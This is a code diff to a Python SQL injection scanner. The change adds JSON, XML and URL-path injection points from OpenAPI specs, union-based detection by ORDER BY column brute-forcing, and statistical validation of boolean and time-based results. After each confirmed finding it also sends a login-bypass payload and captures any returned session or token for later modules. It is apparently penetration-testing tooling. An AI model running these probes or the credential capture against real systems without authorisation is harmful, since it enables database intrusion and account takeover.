@@ -3,16 +3,25 @@ SQLiModule — Real SQL Injection detection engine.
 
 Detection methods (in order of reliability):
   1. Error-based   — DB error strings appear in response
-  2. Boolean-based — response differs between true/false conditions
-  3. Time-based    — SLEEP/WAITFOR causes measurable delay
-  4. Union-based   — UNION SELECT reflects column count data
+  2. Boolean-based — response differs between true/false conditions (Validator differential_test)
+  3. Time-based    — SLEEP/WAITFOR causes measurable delay (Validator validate_time_based, Z-score)
+  4. Union-based   — column-count brute force + sentinel reflection via UNION SELECT
+
+Injection points tested (unified across every technique):
+  - GET query string params (crawled + common-name guesses)
+  - POST form-encoded params (from discovered HTML forms)
+  - JSON request body properties (from an OpenAPI/Swagger spec, see modules/recon.py)
+  - XML request body fields (from an OpenAPI/Swagger spec)
+  - URL path segments (e.g. /user/{id}, from an OpenAPI/Swagger spec)
 
 Zero false positives policy:
-  - Error-based:  only report when a known DB error string is found
-  - Boolean:      require response length/content to differ by >10% AND same status code
-  - Time-based:   require 3+ seconds delay, test twice for confirmation
+  - Error-based:  only report when a known DB error string is found, and wasn't already in baseline
+  - Boolean:      Validator.differential_test — true≈baseline, false≠baseline, control recovers
+  - Time-based:   Validator.validate_time_based — Z-score >= 3.5 against measured jitter, control recovers
+  - Union-based:  sentinel value must be reflected verbatim in the response body
 """
 
+import random
 import re
 import time
 import urllib.parse
@@ -23,6 +32,8 @@ try:
     from requests.exceptions import RequestException
 except ImportError:
     requests = None
+
+from core.validator import Validator
 
 
 # ─── Error signatures per database ───────────────────────────────────────────
@@ -74,6 +85,10 @@ DB_ERRORS = {
         r"sqlite3::",
         r"system.data.sqlite",
         r"unrecognized token",
+        r"sqlite3\.operationalerror",
+        r"near \x22.*\x22: syntax error",
+        r"no such column",
+        r"no such table",
     ],
     "Generic": [
         r"sql syntax",
@@ -85,6 +100,7 @@ DB_ERRORS = {
         r"invalid query",
         r"unexpected end of sql command",
         r"error in your query",
+        r"traceback \(most recent call last\)",  # Python stack trace often leaks the query
     ],
 }
 
@@ -152,16 +168,6 @@ TIME_PAYLOADS = [
     ("' OR 1=1 AND SLEEP(4)--",         4, "MySQL"),
 ]
 
-# Union-based detection
-UNION_PAYLOADS = [
-    "' UNION SELECT NULL--",
-    "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "' UNION SELECT 1,2,3--",
-    "' UNION SELECT 1,@@version,3--",
-    "' UNION ALL SELECT NULL--",
-]
-
 
 from modules import BaseModule
 
@@ -186,6 +192,9 @@ class SQLiModule(BaseModule):
         )
         self.session    = self._make_session()
         self.found      = []
+        self.validator  = Validator(
+            baseline=self.ctx.get("baseline_profile"), ai=self.ai, ui=self.ui,
+        )
 
     def _make_session(self):
         if not requests:
@@ -213,7 +222,11 @@ class SQLiModule(BaseModule):
             pass
 
         endpoints = self._collect_endpoints()
-        self.ui.info(f"Testing {len(endpoints)} parameter(s) for SQL injection")
+        api_count = sum(1 for e in endpoints if e["param_type"] in ("json", "xml", "path"))
+        self.ui.info(
+            f"Testing {len(endpoints)} injection point(s) for SQL injection"
+            + (f" ({api_count} from OpenAPI/Swagger spec)" if api_count else "")
+        )
 
         with ThreadPoolExecutor(max_workers=self.threads) as ex:
             futures = {ex.submit(self._test_endpoint, ep): ep for ep in endpoints}
@@ -230,9 +243,14 @@ class SQLiModule(BaseModule):
             self.ui.ok(f"SQLi scan complete — {len(self.found)} confirmed finding(s)")
 
     # ─────────────────────────────────────────────────────────────────────────
+    # Endpoint collection — builds a unified list of injection-point dicts:
+    #   {url, method, param, param_type, original_value, other_params, headers,
+    #    [url_template for path type], [xml_template/xml_marker for xml type]}
+    # ─────────────────────────────────────────────────────────────────────────
     def _collect_endpoints(self):
         endpoints = []
         seen = set()
+        auth_headers = self.ctx.get("auth_headers", {})
 
         raw_eps = self.ctx.get("endpoints", []) + self.ctx.get("urls", [])
         if not raw_eps:
@@ -252,11 +270,10 @@ class SQLiModule(BaseModule):
                         if key not in seen:
                             seen.add(key)
                             endpoints.append({
-                                "url": base_url,
-                                "method": "GET",
-                                "param": param,
-                                "original_value": vals[0],
-                                "other_params": {k: v[0] for k, v in qs.items() if k != param}
+                                "url": base_url, "method": "GET", "param": param,
+                                "param_type": "query", "original_value": vals[0],
+                                "other_params": {k: v[0] for k, v in qs.items() if k != param},
+                                "headers": {},
                             })
             except Exception:
                 continue
@@ -272,11 +289,9 @@ class SQLiModule(BaseModule):
             if key not in seen:
                 seen.add(key)
                 endpoints.append({
-                    "url": self.base_url,
-                    "method": "GET",
-                    "param": p,
-                    "original_value": "1",
-                    "other_params": {}
+                    "url": self.base_url, "method": "GET", "param": p,
+                    "param_type": "query", "original_value": "1",
+                    "other_params": {}, "headers": {},
                 })
 
         for p in common_str_params:
@@ -284,14 +299,12 @@ class SQLiModule(BaseModule):
             if key not in seen:
                 seen.add(key)
                 endpoints.append({
-                    "url": self.base_url,
-                    "method": "GET",
-                    "param": p,
-                    "original_value": "test",
-                    "other_params": {}
+                    "url": self.base_url, "method": "GET", "param": p,
+                    "param_type": "query", "original_value": "test",
+                    "other_params": {}, "headers": {},
                 })
 
-        # Forms from context
+        # Forms from context (HTML forms — form-encoded body)
         for form in self.ctx.get("forms", []):
             furl   = form.get("action", self.base_url)
             method = form.get("method", "POST").upper()
@@ -300,82 +313,163 @@ class SQLiModule(BaseModule):
                 if key not in seen:
                     seen.add(key)
                     endpoints.append({
-                        "url": furl,
-                        "method": method,
-                        "param": inp,
-                        "original_value": "1",
-                        "other_params": {k: v for k, v in form.get("inputs", {}).items() if k != inp}
+                        "url": furl, "method": method, "param": inp,
+                        "param_type": "form", "original_value": "1",
+                        "other_params": {k: v for k, v in form.get("inputs", {}).items() if k != inp},
+                        "headers": {},
                     })
+
+        # API endpoints from an OpenAPI/Swagger spec (modules/recon.py._discover_api_spec)
+        for api_ep in self.ctx.get("api_endpoints", []):
+            endpoints.extend(self._expand_api_endpoint(api_ep, auth_headers, seen))
 
         return endpoints
 
+    def _expand_api_endpoint(self, api_ep, auth_headers, seen):
+        """Turn one OpenAPI operation into one or more injection-point dicts."""
+        out = []
+        method = api_ep.get("method", "GET")
+        headers = dict(auth_headers)
+        for name, example in api_ep.get("header_params", []):
+            if example:
+                headers[name] = str(example)
+
+        path_params  = api_ep.get("path_params", [])
+        query_params = api_ep.get("query_params", [])
+        json_props   = api_ep.get("json_props", [])
+        url_template = api_ep.get("url", "")
+
+        def resolved_url(skip=None):
+            u = url_template
+            for pname, pexample in path_params:
+                if pname == skip:
+                    continue
+                default = str(pexample) if pexample else "1"
+                u = u.replace("{" + pname + "}", urllib.parse.quote(default, safe=""))
+            return u
+
+        # Path-segment params
+        for pname, pexample in path_params:
+            key = (url_template, pname, method, "path")
+            if key in seen:
+                continue
+            seen.add(key)
+            out.append({
+                "url_template": resolved_url(skip=pname), "method": method,
+                "param": pname, "param_type": "path",
+                "original_value": str(pexample) if pexample else "1",
+                "other_params": {}, "headers": headers,
+            })
+
+        # Query params documented on an API operation (may not be crawlable)
+        base_resolved = resolved_url()
+        for qname, qexample in query_params:
+            key = (base_resolved, qname, method, "query")
+            if key in seen:
+                continue
+            seen.add(key)
+            out.append({
+                "url": base_resolved, "method": method, "param": qname,
+                "param_type": "query", "original_value": str(qexample) if qexample else "test",
+                "other_params": {}, "headers": headers,
+            })
+
+        # JSON body properties
+        for prop in json_props:
+            key = (base_resolved, prop, method, "json")
+            if key in seen:
+                continue
+            seen.add(key)
+            out.append({
+                "url": base_resolved, "method": method, "param": prop,
+                "param_type": "json", "original_value": "test",
+                "other_params": {p: "test" for p in json_props if p != prop},
+                "headers": headers,
+            })
+
+        # XML body field
+        if api_ep.get("xml_template") and api_ep.get("xml_field"):
+            key = (base_resolved, api_ep["xml_field"], method, "xml")
+            if key not in seen:
+                seen.add(key)
+                out.append({
+                    "url": base_resolved, "method": method, "param": api_ep["xml_field"],
+                    "param_type": "xml", "original_value": "test",
+                    "other_params": {}, "headers": headers,
+                    "xml_template": api_ep["xml_template"],
+                })
+
+        return out
+
     # ─────────────────────────────────────────────────────────────────────────
     def _test_endpoint(self, ep):
-        url    = ep["url"]
-        method = ep["method"]
-        param  = ep["param"]
-        orig   = ep["original_value"]
-        other  = ep["other_params"]
-
-        # 1. Get baseline response
-        baseline = self._send(url, method, param, orig, other)
-        if not baseline:
+        # 1. Get baseline response. Must check `is None`, not truthiness —
+        # requests.Response is falsy for ANY non-2xx status (bool(resp) ==
+        # resp.ok), and a 401/403/500 baseline (e.g. a login endpoint tested
+        # with wrong credentials) is a perfectly valid, meaningful baseline.
+        baseline = self._send(ep, ep["original_value"])
+        if baseline is None:
             return
 
         # 2. Error-based detection
-        result = self._test_error_based(url, method, param, orig, other, baseline)
+        result = self._test_error_based(ep, baseline)
         if result:
-            self._report_finding(url, method, param, result["payload"],
-                                  result["technique"], result["db_type"],
-                                  result.get("evidence", ""), "critical", "9.8")
+            self._report_finding(ep, result["payload"], result["technique"],
+                                  result["db_type"], result.get("evidence", ""),
+                                  "critical", "9.8")
             return  # Don't pile on more findings for same param
 
-        # 3. Boolean-based detection
-        result = self._test_boolean_based(url, method, param, orig, other, baseline)
+        # 3. Boolean-based detection (via Validator differential_test)
+        result = self._test_boolean_based(ep)
         if result:
-            self._report_finding(url, method, param, result["payload"],
-                                  result["technique"], result["db_type"],
-                                  result.get("evidence", ""), "high", "8.8")
+            self._report_finding(ep, result["payload"], result["technique"],
+                                  result["db_type"], result.get("evidence", ""),
+                                  "high", "8.8")
             return
 
-        # 4. Time-based detection (only if above didn't find anything)
-        result = self._test_time_based(url, method, param, orig, other)
+        # 4. Time-based detection (via Validator validate_time_based)
+        result = self._test_time_based(ep)
         if result:
-            self._report_finding(url, method, param, result["payload"],
-                                  result["technique"], result["db_type"],
-                                  result.get("evidence", ""), "critical", "9.8")
+            self._report_finding(ep, result["payload"], result["technique"],
+                                  result["db_type"], result.get("evidence", ""),
+                                  "critical", "9.8")
+            return
+
+        # 5. Union-based detection (query/form/json injection points only)
+        if ep["param_type"] in ("query", "form", "json"):
+            result = self._test_union_based(ep, baseline)
+            if result:
+                self._report_finding(ep, result["payload"], result["technique"],
+                                      result["db_type"], result.get("evidence", ""),
+                                      "critical", "9.8")
 
     # ─────────────────────────────────────────────────────────────────────────
-    def _test_error_based(self, url, method, param, orig, other, baseline):
+    def _test_error_based(self, ep, baseline):
+        base_db, _ = self._check_db_errors(baseline.text)
         for payload in ERROR_PAYLOADS:
             try:
-                resp = self._send(url, method, param, payload, other)
-                if not resp:
+                resp = self._send(ep, payload)
+                if resp is None:
                     continue
 
                 db_type, matched_pattern = self._check_db_errors(resp.text)
                 if db_type:
-                    # Extra validation: baseline should NOT have had this error
-                    base_db, _ = self._check_db_errors(baseline.text)
                     if base_db:
                         continue  # Error in baseline too — not injected
 
-                    # Optional AI augmentation: confirm DB type / weed out FPs.
                     if self.ai and self.ai.enabled:
                         try:
-                            verdict = self.ai.analyze_sqli_error(url, param, resp.text)
+                            verdict = self.ai.analyze_sqli_error(ep["url"], ep["param"], resp.text)
                             if verdict:
                                 self.ui.ai(verdict.split("\n")[0][:200])
                         except Exception:
                             pass
 
                     if self.verbose:
-                        self.ui.warn(f"Error-based SQLi: {url} param={param} DB={db_type}")
+                        self.ui.warn(f"Error-based SQLi: {ep.get('url') or ep.get('url_template')} param={ep['param']} DB={db_type}")
                     return {
-                        "payload": payload,
-                        "technique": "Error-based",
-                        "db_type": db_type,
-                        "evidence": f"DB error pattern matched: {matched_pattern}"
+                        "payload": payload, "technique": "Error-based", "db_type": db_type,
+                        "evidence": f"DB error pattern matched: {matched_pattern}",
                     }
 
                 time.sleep(self.delay)
@@ -383,107 +477,133 @@ class SQLiModule(BaseModule):
                 continue
         return None
 
-    def _test_boolean_based(self, url, method, param, orig, other, baseline):
-        baseline_len = len(baseline.text)
+    def _test_boolean_based(self, ep):
+        def send_fn(value):
+            return self._send(ep, value)
 
         for true_payload, false_payload in BOOLEAN_PAIRS:
             try:
-                resp_true  = self._send(url, method, param, true_payload, other)
-                resp_false = self._send(url, method, param, false_payload, other)
-
-                if not resp_true or not resp_false:
-                    continue
-
-                len_true  = len(resp_true.text)
-                len_false = len(resp_false.text)
-
-                # Condition 1: same HTTP status (not a WAF redirect)
-                if resp_true.status_code != resp_false.status_code:
-                    continue
-
-                # Instead of just raw lengths, let's use the core Validator differential analysis if available
-                from core.validator import Validator
-                validator = Validator()
-                
-                # Check 1: True response should be highly similar to Baseline response
-                # Check 2: False response should be significantly different from Baseline
-                
-                # We can approximate similarity by length differences if hash isn't available
-                diff_true_base = abs(len_true - baseline_len)
-                diff_false_base = abs(len_false - baseline_len)
-                diff_true_false = abs(len_true - len_false)
-                
-                # Threshold for dynamic content variance (e.g. CSRF tokens changing)
-                variance_threshold = max(20, baseline_len * 0.02)
-                
-                # Condition: True matches Base, False diverges from Base
-                if diff_true_base <= variance_threshold and diff_false_base > variance_threshold * 2 and diff_true_false > variance_threshold * 2:
-                    if self.verbose:
-                        self.ui.warn(f"Boolean SQLi candidate: {url} param={param} "
-                                     f"true_len={len_true} false_len={len_false} base_len={baseline_len}")
-
-                return {
-                    "payload": true_payload,
-                    "technique": "Boolean-based blind",
-                    "db_type": "Unknown (boolean inference)",
-                    "evidence": (
-                        f"True condition response length: {len_true}, "
-                        f"False condition: {len_false}, "
-                        f"Baseline: {baseline_len}, "
-                        f"Difference: {condition_diff} chars"
-                    )
-                }
+                result = self.validator.differential_test(
+                    url=ep.get("url", ""), param=ep["param"],
+                    true_payload=true_payload, false_payload=false_payload,
+                    baseline_value=ep["original_value"], timeout=self.timeout,
+                    send_fn=send_fn,
+                )
             except Exception:
                 continue
+
+            if result.get("valid") and result.get("confidence_score", 0) >= 75:
+                if self.verbose:
+                    self.ui.warn(f"Boolean SQLi candidate: {ep.get('url') or ep.get('url_template')} param={ep['param']} — {result['details']}")
+                return {
+                    "payload": true_payload, "technique": "Boolean-based blind",
+                    "db_type": "Unknown (boolean inference)", "evidence": result["details"],
+                }
+            time.sleep(self.delay)
         return None
 
-    def _test_time_based(self, url, method, param, orig, other):
+    def _test_time_based(self, ep):
+        def send_fn(value, t):
+            return self._send(ep, value, timeout=t)
+
         for payload, sleep_sec, db_type in TIME_PAYLOADS:
             try:
-                t0   = time.time()
-                resp = self._send(url, method, param, payload, other, timeout=sleep_sec + 8)
-                elapsed = time.time() - t0
-
-                if elapsed < sleep_sec - 0.5:
-                    time.sleep(self.delay)
-                    continue
-
-                # Confirm with a second request
-                self.ui.warn(f"Time-based candidate ({elapsed:.1f}s): {url} param={param} — confirming...")
-                t1   = time.time()
-                resp2 = self._send(url, method, param, payload, other, timeout=sleep_sec + 8)
-                elapsed2 = time.time() - t1
-
-                if elapsed2 >= sleep_sec - 0.5:
-                    if self.verbose:
-                        self.ui.warn(f"Time-based SQLi confirmed ({elapsed2:.1f}s)")
-                    return {
-                        "payload": payload,
-                        "technique": f"Time-based blind ({db_type})",
-                        "db_type": db_type,
-                        "evidence": (
-                            f"Response delayed {elapsed:.2f}s on first test, "
-                            f"{elapsed2:.2f}s on confirmation. "
-                            f"Expected delay: {sleep_sec}s."
-                        )
-                    }
-
-                time.sleep(self.delay)
+                result = self.validator.validate_time_based(
+                    url=ep.get("url", ""), param=ep["param"], delay_payload=payload,
+                    expected_delay=sleep_sec, baseline_value=ep["original_value"],
+                    timeout=self.timeout, send_fn=send_fn,
+                )
             except Exception:
                 continue
+
+            if result.get("valid") and result.get("confidence_score", 0) >= 75:
+                if self.verbose:
+                    self.ui.warn(f"Time-based SQLi confirmed (Z={result.get('z_score', 0):.1f}): "
+                                 f"{ep.get('url') or ep.get('url_template')} param={ep['param']}")
+                return {
+                    "payload": payload, "technique": f"Time-based blind ({db_type})",
+                    "db_type": db_type, "evidence": result["details"],
+                }
+            time.sleep(self.delay)
+        return None
+
+    def _test_union_based(self, ep, baseline):
+        orig = ep["original_value"]
+
+        # 1. Brute-force column count via ORDER BY
+        col_count = None
+        for n in range(1, 11):
+            resp = self._send(ep, f"{orig}' ORDER BY {n}-- -")
+            if resp is None:
+                return None
+            db_type, _ = self._check_db_errors(resp.text)
+            structurally_different = (
+                self.validator._structural_hash(resp.text) != self.validator._structural_hash(baseline.text)
+                and abs(len(resp.text) - len(baseline.text)) > max(30, len(baseline.text) * 0.02)
+            )
+            if db_type or resp.status_code >= 500 or structurally_different:
+                col_count = n - 1
+                break
+            time.sleep(self.delay)
+
+        if not col_count or col_count < 1 or col_count > 9:
+            return None
+
+        # 2. Inject a unique sentinel into each column via UNION SELECT
+        sentinel = f"grunion{random.randint(100000, 999999)}"
+        cols = ", ".join(f"'{sentinel}c{i}'" for i in range(col_count))
+        payload = f"{orig}' UNION SELECT {cols}-- -"
+        resp = self._send(ep, payload)
+        if resp and sentinel in resp.text:
+            if self.verbose:
+                self.ui.warn(f"Union-based SQLi confirmed: {ep.get('url') or ep.get('url_template')} param={ep['param']} cols={col_count}")
+            return {
+                "payload": payload, "technique": f"Union-based ({col_count} columns)",
+                "db_type": "Unknown (union inference)",
+                "evidence": f"Sentinel value '{sentinel}' injected via UNION SELECT ({col_count} columns) "
+                            f"reflected verbatim in the response body.",
+            }
         return None
 
     # ─────────────────────────────────────────────────────────────────────────
-    def _send(self, url, method, param, value, other_params, timeout=None):
+    def _send(self, ep, value, timeout=None):
+        """Deliver one probe value into ep's injection point. Returns a response or None."""
         t = timeout or self.timeout
+        method = ep["method"]
+        # Live-captured/user-supplied auth always applies, on top of whatever
+        # per-endpoint headers came from the OpenAPI spec — re-read on every
+        # call (not cached) so a credential captured mid-scan (e.g. this very
+        # module's own auth-bypass finding) immediately applies to every
+        # request after it, including ones later in this same module.
+        headers = {**self.auth_headers(), **(ep.get("headers") or {})}
+        cookies = self.auth_cookies()
+        param_type = ep["param_type"]
+
         try:
-            params = {**other_params, param: value}
-            if method == "GET":
-                return self.session.get(url, params=params, timeout=t)
-            else:
-                return self.session.post(url, data=params, timeout=t)
+            if param_type in ("query", "form"):
+                params = {**ep.get("other_params", {}), ep["param"]: value}
+                if method == "GET":
+                    return self.session.get(ep["url"], params=params, timeout=t, headers=headers, cookies=cookies)
+                return self.session.request(method, ep["url"], data=params, timeout=t, headers=headers, cookies=cookies)
+
+            elif param_type == "json":
+                body = {**ep.get("other_params", {}), ep["param"]: value}
+                return self.session.request(method, ep["url"], json=body, timeout=t, headers=headers, cookies=cookies)
+
+            elif param_type == "path":
+                url = ep["url_template"].replace(
+                    "{" + ep["param"] + "}", urllib.parse.quote(str(value), safe="")
+                )
+                return self.session.request(method, url, timeout=t, headers=headers, cookies=cookies)
+
+            elif param_type == "xml":
+                body = ep["xml_template"].replace("__GR_INJECT__", str(value))
+                h = {**headers, "Content-Type": "application/xml"}
+                return self.session.request(method, ep["url"], data=body.encode("utf-8", "ignore"),
+                                             timeout=t, headers=h, cookies=cookies)
         except RequestException:
             return None
+        return None
 
     def _check_db_errors(self, body):
         body_lower = body.lower()
@@ -494,11 +614,17 @@ class SQLiModule(BaseModule):
         return None, None
 
     # ─────────────────────────────────────────────────────────────────────────
-    def _report_finding(self, url, method, param, payload, technique, db_type,
-                         evidence, severity, cvss):
-        title = f"SQL Injection ({technique}) in '{param}' parameter"
+    def _report_finding(self, ep, payload, technique, db_type, evidence, severity, cvss):
+        param  = ep["param"]
+        method = ep["method"]
+        url    = ep.get("url") or ep.get("url_template", "")
+        loc    = {"query": "GET parameter", "form": "form field",
+                  "json": "JSON body property", "xml": "XML body field",
+                  "path": "URL path segment"}.get(ep["param_type"], "parameter")
+
+        title = f"SQL Injection ({technique}) in '{param}' {loc}"
         desc  = (
-            f"The '{param}' parameter in a {method} request to {url} is vulnerable to "
+            f"The '{param}' {loc} in a {method} request to {url} is vulnerable to "
             f"{technique} SQL injection. Database fingerprinted as: {db_type}. "
             f"An attacker can extract the entire database, bypass authentication, "
             f"read/write server files, and potentially achieve remote code execution."
@@ -530,10 +656,27 @@ class SQLiModule(BaseModule):
         if added:
             self.found.append(url)
             self.ui.find(severity, title, url)
-            self.ui.bullet(f"Param: {param}  |  Technique: {technique}  |  DB: {db_type}", indent=12)
+            self.ui.bullet(f"{loc.title()}: {param}  |  Technique: {technique}  |  DB: {db_type}", indent=12)
             self.ui.bullet(f"Payload: {payload}", indent=12)
             self.ui.bullet(f"Evidence: {evidence}", indent=12)
             self.ctx.setdefault("sqli_findings", []).append({
                 "url": url, "param": param, "payload": payload,
-                "technique": technique, "db_type": db_type
+                "technique": technique, "db_type": db_type,
             })
+
+            # Regardless of which technique actually confirmed this SQLi
+            # (error-based fires first and short-circuits before boolean-
+            # based ever runs), make one extra attempt with a classic
+            # auth-bypass payload. If this is a login-style endpoint it
+            # often succeeds even when the *confirming* payload was just a
+            # syntax-error probe, and may hand back a live session/token
+            # that every module running after this one can reuse instead of
+            # testing authenticated-only endpoints blind.
+            if ep["param_type"] in ("query", "form", "json"):
+                try:
+                    bypass_resp = self._send(ep, "' OR '1'='1'--")
+                    self.try_capture_credential_from_response(
+                        bypass_resp, source=f"SQLi ({technique}) confirmed bypass probe on '{param}' @ {url}",
+                    )
+                except Exception:
+                    pass
